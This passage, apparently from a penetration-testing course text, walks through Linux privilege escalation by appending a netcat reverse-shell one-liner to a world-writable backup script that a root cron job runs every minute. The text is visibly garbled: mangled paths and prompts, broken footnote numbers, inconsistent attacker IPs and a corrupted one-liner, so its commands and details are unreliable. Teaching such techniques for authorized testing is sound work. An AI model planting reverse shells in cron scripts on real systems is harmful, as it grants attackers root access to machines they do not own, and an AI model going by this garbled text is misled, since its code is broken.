Listing 490 - Inspecting the cron log file

It appears that a script user_backups.sh under /home/joe/ is executed in the context of the root user. By judging the timestamps, it seems that this job runs every minute once.

Since we know the location of debian-privesc:-$ we can inspect its contents and permissions.

Listing 491 - Showing contents and permissions of the user_backups.script

The script itself is fairly straightforward; it simply copies the user's home directory to the backups subdirectory. The permissions⁸⁸⁹ of the script reveal that every level user can write to the file.

If an unauthorized user can modify the contents of the backup script, we can edit it and add a reverse shell one-liner⁸⁸⁰ If our plan works, we should receive a root-level reverse shell on our attacking machine, after a one-minute period.

```
joe@debian-privesc:-$ cd .scripts
joe@debian-privesc:-/.scripts$ echo >> user_backups.sh
joe@debian-privesc:-/.scripts$ echo "rm /tmp;mkfifo /tmp/cat /tmp/|/bin/sh -i\n2&|nc 192.168.112 1234 /tmp/" >> user_backups.sh
joe@debian-privesc:-$.$ cat user_backups.sh
#!/bin/bash
cp -rf /home/joe/ /var/backups/joe/

rm /tmp;mkfifo /tmp/cat /tmp/|/bin/sh -i 2&|nc 10.11.0.4 1234 >/tmp/fnexecute.
```
